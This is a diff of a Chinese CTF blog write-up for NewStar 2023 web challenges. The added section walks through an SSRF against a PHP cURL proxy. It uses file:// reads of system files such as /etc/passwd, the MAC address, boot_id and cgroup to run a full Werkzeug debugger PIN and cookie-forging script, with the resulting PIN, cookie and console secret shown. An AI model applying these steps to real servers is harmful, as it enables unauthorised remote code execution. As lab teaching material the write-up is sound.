@@ -284,7 +284,11 @@
     <li><a href="#泄漏的秘密">泄漏的秘密</a></li>
     <li><a href="#begin-of-upload">Begin of Upload</a></li>
     <li><a href="#begin-of-http">Begin of HTTP</a></li>
-    <li><a href="#errorflask">ErrorFlask</a></li>
+    <li><a href="#errorflask">ErrorFlask</a>
+      <ol>
+        <li><a href="#flask页面报错泄露">flask页面报错泄露</a></li>
+      </ol>
+    </li>
     <li><a href="#begin-of-php">Begin of PHP</a></li>
     <li><a href="#rce">R!C!E!</a></li>
     <li><a href="#easylogin">EasyLogin</a>
@@ -392,13 +396,21 @@
         <li><a href="#考点cve-2022-39227-python-jwt漏洞pickle反序列化">考点：CVE-2022-39227-Python-JWT漏洞+pickle反序列化</a></li>
       </ol>
     </li>
-    <li><a href="#pppython">pppython?</a></li>
+    <li><a href="#pppython">pppython?</a>
+      <ol>
+        <li><a href="#计算pin码">计算Pin码</a></li>
+      </ol>
+    </li>
     <li><a href="#4-复盘">4-复盘</a>
       <ol>
         <li><a href="#考点目录穿越pearcmd文件包含gzip提权">考点：目录穿越pearcmd文件包含+gzip提权</a></li>
       </ol>
     </li>
-    <li></li>
+    <li><a href="#nextdrive">NextDrive</a>
+      <ol>
+        <li><a href="#md5伪造秒传下载文件伪造cookie目录穿越">md5伪造秒传下载文件+伪造cookie+目录穿越</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -467,7 +479,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 37 分钟
+                    阅读时长: 43 分钟
                 </time>
             </div>
         
@@ -537,7 +549,8 @@
 <img src="image-20250508201941510.png" alt="image-20250508201941510" style="zoom:50%;" />
 <p>没啥好说的，ctfer入门八股文。</p>
 <h2 id="errorflask">ErrorFlask
-</h2><p>尝试传参number1和2，发现会回显其值的和，提示不是ssti，但是还是不知道考啥</p>
+</h2><h3 id="flask页面报错泄露">flask页面报错泄露
+</h3><p>尝试传参number1和2，发现会回显其值的和，提示不是ssti，但是还是不知道考啥</p>
 <img src="image-20250508203557715.png" alt="image-20250508203557715" style="zoom:50%;" />
 <p>灵机一动只传一个报错了，上面提示在源码里。所有查看app.py,flag竟然藏在里面</p>
 <img src="image-20250508203620076.png" alt="image-20250508203620076" style="zoom:50%;" />
@@ -4668,23 +4681,23 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
 </span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="err">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">&#39;hint&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="p">[</span><span class="s2">&#34;your?&#34;</span><span class="p">,</span> <span class="s2">&#34;mine!&#34;</span><span class="p">,</span> <span class="s2">&#34;hint!!&#34;</span><span class="p">]){</span>
-</span></span><span class="line"><span class="cl">        <span class="n">header</span><span class="p">(</span><span class="s2">&#34;Content-type: text/plain&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s2">&#34;ls / -la&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="err">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">&#39;hint&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="p">[</span><span class="s2">&#34;your?&#34;</span><span class="p">,</span> <span class="s2">&#34;mine!&#34;</span><span class="p">,</span> <span class="s2">&#34;hint!!&#34;</span><span class="p">]){</span>  <span class="o">//</span> <span class="n">检查请求参数hint是否等于数组</span><span class="p">[</span><span class="s2">&#34;your?&#34;</span><span class="p">,</span> <span class="s2">&#34;mine!&#34;</span><span class="p">,</span> <span class="s2">&#34;hint!!&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">header</span><span class="p">(</span><span class="s2">&#34;Content-type: text/plain&#34;</span><span class="p">);</span>  <span class="o">//</span> <span class="n">设置响应头为纯文本格式</span>
+</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s2">&#34;ls / -la&#34;</span><span class="p">);</span>  <span class="o">//</span> <span class="n">执行系统命令</span><span class="err">，</span><span class="n">列出根目录下的所有文件</span><span class="err">（</span><span class="n">包括隐藏文件</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">();</span>  <span class="o">//</span> <span class="n">终止脚本执行</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">ch</span> <span class="o">=</span> <span class="n">curl_init</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">        <span class="n">curl_setopt</span><span class="p">(</span><span class="err">$</span><span class="n">ch</span><span class="p">,</span> <span class="n">CURLOPT_URL</span><span class="p">,</span> <span class="err">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">curl_setopt</span><span class="p">(</span><span class="err">$</span><span class="n">ch</span><span class="p">,</span> <span class="n">CURLOPT_CONNECTTIMEOUT</span><span class="p">,</span> <span class="mi">60</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">curl_setopt</span><span class="p">(</span><span class="err">$</span><span class="n">ch</span><span class="p">,</span> <span class="n">CURLOPT_HTTPHEADER</span><span class="p">,</span> <span class="err">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">&#39;lolita&#39;</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">output</span> <span class="o">=</span> <span class="n">curl_exec</span><span class="p">(</span><span class="err">$</span><span class="n">ch</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">echo</span> <span class="err">$</span><span class="n">output</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="n">curl_close</span><span class="p">(</span><span class="err">$</span><span class="n">ch</span><span class="p">);</span>   
-</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="n">catch</span> <span class="p">(</span><span class="n">Error</span> <span class="err">$</span><span class="n">x</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">        <span class="n">highlight_file</span><span class="p">(</span><span class="n">__FILE__</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">highlight_string</span><span class="p">(</span><span class="err">$</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">getMessage</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>  <span class="o">//</span> <span class="n">开始异常处理</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">ch</span> <span class="o">=</span> <span class="n">curl_init</span><span class="p">();</span>  <span class="o">//</span> <span class="n">初始化一个cURL会话</span>
+</span></span><span class="line"><span class="cl">        <span class="n">curl_setopt</span><span class="p">(</span><span class="err">$</span><span class="n">ch</span><span class="p">,</span> <span class="n">CURLOPT_URL</span><span class="p">,</span> <span class="err">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]);</span>  <span class="o">//</span> <span class="n">设置要访问的URL</span><span class="err">，</span><span class="n">从请求参数url中获取</span>
+</span></span><span class="line"><span class="cl">        <span class="n">curl_setopt</span><span class="p">(</span><span class="err">$</span><span class="n">ch</span><span class="p">,</span> <span class="n">CURLOPT_CONNECTTIMEOUT</span><span class="p">,</span> <span class="mi">60</span><span class="p">);</span>  <span class="o">//</span> <span class="n">设置连接超时时间为60秒</span>
+</span></span><span class="line"><span class="cl">        <span class="n">curl_setopt</span><span class="p">(</span><span class="err">$</span><span class="n">ch</span><span class="p">,</span> <span class="n">CURLOPT_HTTPHEADER</span><span class="p">,</span> <span class="err">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">&#39;lolita&#39;</span><span class="p">]);</span>  <span class="o">//</span> <span class="n">设置HTTP请求头</span><span class="err">，</span><span class="n">从请求参数lolita中获取</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">output</span> <span class="o">=</span> <span class="n">curl_exec</span><span class="p">(</span><span class="err">$</span><span class="n">ch</span><span class="p">);</span>  <span class="o">//</span> <span class="n">执行cURL请求并获取输出</span>
+</span></span><span class="line"><span class="cl">        <span class="n">echo</span> <span class="err">$</span><span class="n">output</span><span class="p">;</span>  <span class="o">//</span> <span class="n">输出请求结果</span>
+</span></span><span class="line"><span class="cl">        <span class="n">curl_close</span><span class="p">(</span><span class="err">$</span><span class="n">ch</span><span class="p">);</span>   <span class="o">//</span> <span class="n">关闭cURL会话</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="n">catch</span> <span class="p">(</span><span class="n">Error</span> <span class="err">$</span><span class="n">x</span><span class="p">){</span>  <span class="o">//</span> <span class="n">捕获可能发生的错误</span>
+</span></span><span class="line"><span class="cl">        <span class="n">highlight_file</span><span class="p">(</span><span class="n">__FILE__</span><span class="p">);</span>  <span class="o">//</span> <span class="n">高亮显示当前文件内容</span>
+</span></span><span class="line"><span class="cl">        <span class="n">highlight_string</span><span class="p">(</span><span class="err">$</span><span class="n">x</span><span class="o">-&gt;</span><span class="n">getMessage</span><span class="p">());</span>  <span class="o">//</span> <span class="n">高亮显示错误信息</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
@@ -4699,8 +4712,327 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?hint[]=your?&amp;hint[]=mine!&amp;hint[]=hint!!
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>显然要提权</p>
-<img src="image-20250514101336448.png" alt="image-20250514101336448" style="zoom:50%;" />
+</div><p>发现是需要root才能查看，现在权限不能查看flag。<img src="image-20250514101336448.png" alt="image-20250514101336448" style="zoom:50%;" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=file:///app.py&amp;lolita[]=			#读app.py,这里比赛的时候是flask框架，apache环境，但是在buu环境确实显示nginx环境，但是也能打
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2023-newstar-web/image-20250527195328727.png"
+	width="1887"
+	height="201"
+	srcset="/p/2023-newstar-web/image-20250527195328727_hu_3b5debe00ca360b7.png 480w, /p/2023-newstar-web/image-20250527195328727_hu_d78191526b799f7a.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250527195328727"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="938"
+		data-flex-basis="2253px"
+	
+></p>
+<p>发现可以伪造session拿flag，但是连cookie都没有。</p>
+<h3 id="计算pin码">计算Pin码
+</h3><p>但是我们发现debug开启监听1314端口。我们可以通过计算Pin码进入调试模式。解释一下pin码是在开启debug模式下，进行代码调试模式所需的进入密码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#计算pin的必要条件</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1.</span><span class="n">username</span> <span class="n">在可以任意文件读的条件下读</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd进行猜测</span><span class="c1">#这里不需要就是root</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span><span class="n">modname</span> <span class="n">默认flask</span><span class="o">.</span><span class="n">app</span>
+</span></span><span class="line"><span class="cl"><span class="mf">3.</span><span class="n">appname</span> <span class="n">默认Flask</span>
+</span></span><span class="line"><span class="cl"><span class="mf">4.</span><span class="n">moddir</span> <span class="n">flask库下app</span><span class="o">.</span><span class="n">py的绝对路径</span><span class="p">,</span><span class="n">可以通过报错拿到</span><span class="p">,</span><span class="n">如传参的时候给个不存在的变量</span>
+</span></span><span class="line"><span class="cl"><span class="mf">5.</span><span class="n">uuidnode</span> <span class="n">mac地址的十进制</span><span class="p">,</span><span class="n">任意文件读</span> <span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">class</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">eth0</span><span class="o">/</span><span class="n">address</span>
+</span></span><span class="line"><span class="cl"><span class="mf">6.</span><span class="n">machine_id</span> <span class="n">机器码</span> <span class="n">这个待会细说</span><span class="p">,</span><span class="n">一般就生成pin码不对就是这错了</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>前3个都好说，那我们来求后3个</p>
+<p><strong>moddir flask</strong>-目录下面app.py的绝对路径,可以通过报错拿到</p>
+<p>我们可以输入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=127.0.0.1:1314&amp;lolita[]=
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">解释：要报错这里一定要设置</span> <span class="nx">url</span><span class="o">=</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">:</span><span class="mi">1314</span> <span class="nx">让</span> <span class="nx">cURL</span> <span class="nx">访问本地调试服务（所以上面得到的端口很重要），然后要设置错误的</span> <span class="nx">lolita</span><span class="p">[]</span> <span class="nx">参数从而触发</span> <span class="nx">PHP</span> <span class="nx">错误（它这里要求数组，我们就设置字符）</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250527201200287.png" alt="image-20250527201200287" style="zoom:50%;" />
+<p>得到app.py绝对路径是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">python3</span><span class="o">.</span><span class="mi">10</span><span class="o">/</span><span class="nx">dist</span><span class="o">-</span><span class="nx">packages</span><span class="o">/</span><span class="nx">flask</span><span class="o">/</span><span class="nx">app</span><span class="o">.</span><span class="nx">py</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>uuidnode mac地址的十进制表达</strong></p>
+<p>任意文件读 /sys/class/net/eth0/address</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?url=file:///sys/class/net/eth0/address&amp;lolita[]=
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到fe:0c:e6:0e:bd:e5，10进制是279331352788453（注意后面这个1别加）</p>
+<p><img src="/p/2023-newstar-web/image-20250527205227252.png"
+	width="1914"
+	height="293"
+	srcset="/p/2023-newstar-web/image-20250527205227252_hu_722c57caa9f9e47c.png 480w, /p/2023-newstar-web/image-20250527205227252_hu_880c597ffa2eab75.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250527205227252"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="653"
+		data-flex-basis="1567px"
+	
+></p>
+<p>还有就是要去冒号</p>
+<img src="image-20250527210343732.png" alt="image-20250527210343732" style="zoom:50%;" />
+<p>就这里都连错2次&hellip;&hellip;.</p>
+<p><strong>机器码</strong></p>
+<p>机器ID可能在/sys/machine-id下，如果使用docker，则需要查找/proc/sys/kernel/random/boot_id(/etc/machine-id有时候行)，得到前半段，/proc/self/cgroup得到后半段，拼接后计算</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">url</span><span class="o">=</span><span class="nx">file</span><span class="o">:///</span><span class="nx">proc</span><span class="o">/</span><span class="nx">sys</span><span class="o">/</span><span class="nx">kernel</span><span class="o">/</span><span class="nx">random</span><span class="o">/</span><span class="nx">boot_id</span><span class="o">&amp;</span><span class="nx">lolita</span><span class="p">[]</span><span class="o">=</span>   <span class="c1">#得到前半段48ba352e-c8e8-49d6-b2b6-b0bda0dfafb8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">url</span><span class="o">=</span><span class="nx">file</span><span class="o">:///</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">cgroup</span><span class="o">&amp;</span><span class="nx">lolita</span><span class="p">[]</span><span class="o">=</span>		<span class="c1"># 只读取第一行，并以从右边算起的第一个/为分隔符，得到docker-b8936aef683b19f39076288a450cd9cb757fae7c45a98e10ab265f8ac197b8d6.scope
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2023-newstar-web/image-20250527202630673.png"
+	width="1304"
+	height="175"
+	srcset="/p/2023-newstar-web/image-20250527202630673_hu_e15647a6d6f3750c.png 480w, /p/2023-newstar-web/image-20250527202630673_hu_6b0d50e56731101e.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250527202630673"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="745"
+		data-flex-basis="1788px"
+	
+></p>
+<p>然后再用计算pin的脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;root&#39;</span> <span class="c1"># username 可通过/etc/passwd获取</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;flask.app&#39;</span><span class="p">,</span> <span class="c1"># modname默认值</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Flask&#39;</span><span class="p">,</span>  <span class="c1">#默认值 getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;/usr/local/lib/python3.10/dist-packages/flask/app.py&#39;</span>  <span class="c1"># 路径 可报错得到  getattr(mod, &#39;__file__&#39;, None)</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;279331352788453&#39;</span><span class="p">,</span> <span class="c1"># /sys/class/net/eth0/address mac地址十进制</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># /etc/machine-id</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;48ba352e-c8e8-49d6-b2b6-b0bda0dfafb8docker-b8936aef683b19f39076288a450cd9cb757fae7c45a98e10ab265f8ac197b8d6.scope&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cookiesalt&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cookie_name</span> <span class="o">=</span> <span class="s1">&#39;__wzd&#39;</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">num</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pinsalt&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%09d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rv</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">rv</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                          <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hash_pin</span><span class="p">(</span><span class="n">pin</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">pin</span><span class="si">}</span><span class="s2"> added salt&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="s2">&#34;replace&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">12</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">cookie_name</span> <span class="o">+</span> <span class="s2">&#34;=&#34;</span> <span class="o">+</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span><span class="si">}</span><span class="s2">|</span><span class="si">{</span><span class="n">hash_pin</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pin:186-342-824
+</span></span><span class="line"><span class="cl">cookie:__wzd9f0169d250239adb82c5=1748350903|f403026852e3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">然后就是传参。这里我们要去获取frm和s的值
+</span></span><span class="line"><span class="cl">frm如果没有报错信息的话值为0
+</span></span><span class="line"><span class="cl">s的值可以直接访问/console，然后查看源码的SECRET值
+</span></span><span class="line"><span class="cl">?url=http://localhost:1314/console&amp;lolita[]=
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250527203903469.png" alt="image-20250527203903469" style="zoom:50%;" />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">得到s=lSWrjtandT1vxutfBNBh
+</span></span></code></pre></td></tr></table>
+</div>
